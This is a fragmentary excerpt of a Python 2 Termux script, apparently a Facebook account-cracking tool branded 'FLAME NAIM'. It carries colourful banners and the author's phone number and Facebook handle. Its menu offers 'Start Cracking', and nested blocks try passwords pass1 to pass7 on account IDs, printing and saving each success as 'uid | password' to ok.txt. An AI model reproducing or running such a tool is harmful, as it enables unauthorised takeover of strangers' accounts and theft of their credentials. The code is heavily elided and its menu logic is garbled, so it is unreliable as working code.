...
logo1 = """
\033[1;91mNN     NN     AAA      IIIII   MM      MM
\033[1;92mNNN  NN  AAAAA    III  MMM   MMM
\033[1;93mNN N NN  AA   AA    III  MM MM MM
\033[1;94mNN NNN AAAAAAA III  MM        MM
\033[1;95mNN   NN    AA   AA    IIIII MM       MM
\033[1;96m
\033[1;97m
...
\x1b[1;93mBangladeshi Brand
\x1b[1;92m➣ NAME :  💗 FLAME NAIM💗
\x1b[1;91m➣ CYBER NAME :  💣 FLAME NAIM  HACKER💣
\x1b[1;93m➣ WHATSAPP NO :  👬 01741747795👬
\x1b[1;95m➣ WARNING :  ⚠️ DON'T SEE PRON 🥵
\x1b[1;96m➣ FUNNY LINE :  SINGLE GIRLS ADD ME
\x1b[1;93mWARNING : ENJOY FREE CLONING CREDIT TO 🔥FLAME NAIM🔥
\x1b[1;97m➣ NOTE :      💕USE 4GB YA 6GB RAM MOBILE💕
\x1b[1;92m➣ NOTE :      👏USE FAST 4G SIM NET👏
\x1b[1;91m➣ NOTE :      ⚠️JOIN TO MY TERMUX BOX INBOX ME ON FACEBOOK⚠️
\x1b[1;95m➣ FACEBOOK :  🎯Flame Naim🎯
...
def menu():
    ...
    print 47*("-")
    print
    print("[1] FLAME NAIM Start Cracking")
    print("[2] FLAME NAIM Grab Numbers")
    print("[3] Contact")
    print("[4] Update")
    print("[5] Logout")
    print 
...
def menu_select():
    ...
    if option =="1":
        ...
        os.system("clear")
        print 
        ham("\033[1;32m[✓] FLAME NAIM Tool Has Been Updated Successfully\033[0;97m")
        time.sleep(1)
        ...
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\r\033[1;32m[✓] NAIM Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[FLAME-NAIM-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
